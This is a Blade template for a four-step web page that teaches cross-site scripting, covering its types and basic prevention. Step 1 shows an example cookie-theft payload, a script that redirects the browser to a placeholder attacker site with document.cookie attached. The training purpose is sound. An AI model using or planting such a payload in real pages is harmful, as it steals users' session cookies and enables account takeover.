@extends('redteam.base')

@section('title', 'Cross-Site Scripting Learning Page')

@section('pagecontent')
<div class="redLearn">
    <form method="POST" action="/learn/xss">
        @csrf
        <input type="hidden" name="step" value="{{ $step }}">
        @if ($step != 1)
            <div class="form-group row mb-0">
                <div class="col-md-8 offset-md-4">
                    <button type="submit" class="btn btn-primary" name="stepChange" value="-1">
                        Previous
                    </button>
                </div>
            </div>
        @endif

        @if ($step == 1)
            <h4>What is an XSS attack?</h4>
            <p>An XSS, or cross-site scripting, attack is when an attacker injects code into a server <br>
                in order to execute malicious javascript on another user's browser. The attacker exploits <br>
                a vulnerability in the website in order to make the malicious javascript appear as it were <br>
                to be a legitimate part of the website.</p>
            <p>If a server uses a script similar to this: </p>
            <p class="sqlInject"><strong>print "<?php echo htmlspecialchars("<html>") ?>" <br>
                print "User Input:" <br>
                print database.userInput <br>
                print "<?php echo htmlspecialchars("</html>") ?>"</strong></p>
            <p>A user could create user input that says: </p>
            <p class="sqlInject"><strong><?php echo htmlspecialchars("<script>") ?>
                window.location='http://attackerswebsite/?cookie='+document.cookie
                <?php echo htmlspecialchars("</script>") ?></strong></p>
            <p>The resulting output on the webpage would then result in: </p>
            <p class="sqlInject"><strong><?php echo htmlspecialchars("<html>") ?> <br>
                User Input: <br>
                <?php echo htmlspecialchars("<script>") ?> <br>
                window.location='http://attackerswebsite/?cookie='+document.cookie <br>
                <?php echo htmlspecialchars("</script>") ?> <br>
                <?php echo htmlspecialchars("</html>") ?></strong></p>
            <p>This malicious javascript displayed on an unsuspecting user's page <br>
                will then execute this javascript and send a request to the attackers <br>
                webpage with the victims cookie as data. This is an example of how <br>
                attackers can obtain private or sensitive information by XSS. This <br>
                is called cookie theft, but there are different kinds like keylogging or phishing.</p>
        @elseif ($step == 2)
            <h4>Types of XSS</h4>
            <ul>
                <li>Persistent XSS: the malicious string is from the website's database</li>
                <li>Reflected XSS: the malicious string is from the user's request</li>
                <li>DOM-based XSS: the vulnerability is client-side and not server-side</li>
            </ul><br>
            <p>The first page went over persistent XSS, where a user submits malicious <br>
                javascript to the database, and then it is accessed. Reflected XSS seems like <br>
                it might be useless if a user is attacking itself, but the user is unaware they <br>
                are submitting a malicious string. This is usually done by an attacker sending <br>
                out a URL with the malicious string inside of its request. When the user clicks <br>
                the URL it will submit the malicious string and then execute that string when displayed <br>
                on the target page.</p>
            <p>DOM-based XSS is a sort of mix between the two previously described types. When the server-side <br>
                sends HTML that contains javascript, sometimes the javascript is responsible for displaying content. <br>
                when this occurs, if the content being displayed is a malicious script, the server-side will <br>
                be completely unaware. This means the browser executes this malicious script client-side <br>
                possibly causing them to send a cookie to the attackers website.</p>
        @elseif ($step == 3)
            <h4>Ways to prevent XSS</h4>
            <p>In order to be able to display user input without the contained script, <br>
                proper input/output handling is needed in your program. Two different ways of <br>
                handling input are encoding and validation. There are a lot of different factors <br>
                into how it actually gets handled. Depending on where the user input is inserted, <br>
                the user may insert the closing delimeter for the HTML tag/code in order to further <br>
                insert malicious javascript.</p>

        @elseif ($step == 4)
            <h4></h4>
            <p></p>

        @endif
        <!-- Reference:  https://excess-xss.com/ -->
        @if ($step != 4)
            <div class="form-group row mb-0">
                <div class="col-md-8 offset-md-4">
                    <button type="submit" class="btn btn-primary" name="stepChange" value="1">
                        Next
                    </button>
                </div>
            </div>
        @endif
    </form>
</div>
@endsection